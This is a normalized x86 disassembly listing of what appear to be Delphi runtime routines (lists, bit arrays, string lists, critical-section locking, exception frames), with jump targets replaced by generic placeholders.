jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413964
sub_413bd8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413a00
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4026fc
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_413c14
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413a00
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_413bd8
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402cac
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_413964
dec ebp
inc edi
jne r-xdata
sub_413c88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_413cdc
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40361c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413de0
xor eax eax
push ebp
push sub_413d3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403290
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403280
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413d45
mov eax [ ebp - 0x4 ]
call sub_413e44
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_413d58
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413de0
xor eax eax
push ebp
push sub_413dd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413918
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413ad0
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ddb
mov eax [ ebp - 0x4 ]
call sub_413e44
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_413a00
sub_413df4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413de0
xor eax eax
push ebp
push sub_413e37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413bb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413e3e
mov eax [ ebp - 0x4 ]
call sub_413e44
retn
sub_413e50
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_413ea4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_413ea4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_413e80
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026bc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402cac
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026dc
mov edx edi
mov eax ebp
call sub_413e98
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028b8
sub_413f48
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_413e80
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_413ea4
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_413f8c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_414004
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
call sub_4166fc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_414044
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4140fa
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404078
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404244
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031e0
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414101
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_414120
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4141b5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031e0
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_404244
mov eax ebx
mov si 0xffff
call sub_40348c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141bc
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax ebx
mov si 0xffff
call sub_40348c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40348c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404360
sub_4141c7
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034e4
mov eax ebx
mov si 0xffff
call sub_40348c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40348c
push eax
lea eax [ ebx + 0x4 ]
call sub_40564c
mov ecx eax
mov edx r-xdata
pop eax
call sub_403344
sub_414212
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414264
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403344
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41428c
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4142ac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_414306
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_413b5c
call sub_403290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_414314
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414e6c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414004
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_414344
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414368
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41438c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414433
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4144dc
xor eax eax
push ebp
push sub_414416
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41441d
mov eax [ ebp - 0x4 ]
call sub_414598
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_414444
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414030
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4144dc
xor eax eax
push ebp
push sub_4144c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414598
retn
sub_4144f4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4145ac
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41454c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_414d04
mov eax [ ebp - 0x8 ]
push eax
push sub_414fb4
push ebp
call sub_4144f4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4145ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414641
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414648
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404004
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4043ec
jne r-xdata
sub_414658
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_414654
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
jmp sub_403a1c
sub_414690
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4146d8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405b10
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414658
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4146df
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_4146e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4147c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4144dc
xor eax eax
push ebp
push sub_41479e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147a5
mov eax [ ebp - 0x4 ]
call sub_414598
retn
sub_4147dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_414821
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4044a0
call sub_408754
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414828
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_414830
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41493b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404078
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_4040d0
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414942
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404004
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4042a0
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4042a0
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4042a0
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4042a0
mov ebx eax
test ebx ebx
je r-xdata
sub_414958
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4149d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149d7
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_4149e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414aa7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404500
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_415044
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4041c8
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c0f4
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414aae
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404004
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
sub_414ab8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_414aec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414b1c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415b80
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414b64
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b6b
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_414b70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414c0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4144dc
xor eax eax
push ebp
push sub_414bf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_4156cc
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_4040d0
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bf7
mov eax [ ebp - 0x4 ]
call sub_414598
retn
sub_414c1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414cbd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414cc4
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov eax [ ebp - 0x4 ]
call sub_4144dc
xor eax eax
push ebp
push sub_414ca0
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414598
retn
sub_414ccc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414d04
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414da8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4178bc
mov eax [ ebp - 0x4 ]
call sub_4144dc
xor eax eax
push ebp
push sub_414d83
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
